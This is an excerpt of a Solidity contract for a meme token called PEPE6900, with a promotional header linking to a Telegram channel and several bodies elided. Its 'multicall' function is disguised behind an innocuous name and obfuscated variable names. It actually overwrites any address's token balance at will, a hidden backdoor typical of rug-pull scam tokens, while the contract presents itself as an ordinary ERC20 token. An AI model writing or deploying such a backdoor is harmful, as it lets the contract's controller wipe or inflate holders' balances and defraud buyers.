/**
   Welcome to PEPE6900 Channel. Quantum & advanced trading techniques  
   compose PEPE6900. A revolutionary use of tech & prowess.
  TELEGRAM: https://t.me/Pepe6900_BSC
*/
...
contract PEPE6900 is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private FCWKaiv;
    ...
    string private constant _name = "PEPE6900";
    string private constant _symbol = "PEPE6900";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        FCWKaiv[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        FCWKaiv[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = FCWKaiv[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        FCWKaiv[from] = fromBalance - Menge;

        FCWKaiv[to] = FCWKaiv[to].add(Menge);
